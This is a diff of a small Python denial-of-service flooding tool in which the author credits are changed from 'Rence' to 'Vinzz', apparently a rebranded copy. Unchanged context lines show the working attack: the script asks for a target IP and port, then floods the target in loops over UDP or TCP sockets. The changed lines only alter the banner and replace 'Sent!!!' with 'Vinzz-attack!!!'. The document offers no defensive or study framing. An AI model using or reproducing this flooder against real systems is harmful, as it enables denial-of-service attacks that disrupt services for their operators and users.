@@ -4,11 +4,11 @@ import random
 import socket
 import threading
 
-print("~~~ DDOS TOOLS By Rence ~~~")
-print("~~~ Code and Scripted by Rence ~~~")
-print("~~~ Script ini dibuat hanya untuk rence Pribadi. ~~~")
-print("~~~ Don't Forget to subscribe Ren Samp ~~~")
-print("~~~ DDOS by rence dibuat hanya untuk kontent. ~~~")
+print("~~~ DDOS TOOLS By Vinzz ~~~")
+print("~~~ Code and Scripted by Vinzz ~~~")
+print("~~~ Script ini dibuat hanya untuk Vinzz Pribadi. ~~~")
+print("~~~ Don't Forget to subscribe Vinzz Samp ~~~")
+print("~~~ DDOS by Vinzz dibuat hanya untuk kontent. ~~~")
 ip = str(input(" Target Ip:"))
 port = int(input(" Target Port:"))
 choice = str(input(" UDP(y/n):"))
@@ -23,7 +23,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" Vinzz-attack!!!")
 		except:
 			print("[!] Error!!!")
 
@@ -37,7 +37,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Sent!!!")
+			print(i +" Vinzz-attack!!!")
 		except:
 			s.close()
 			print("[*] Error")
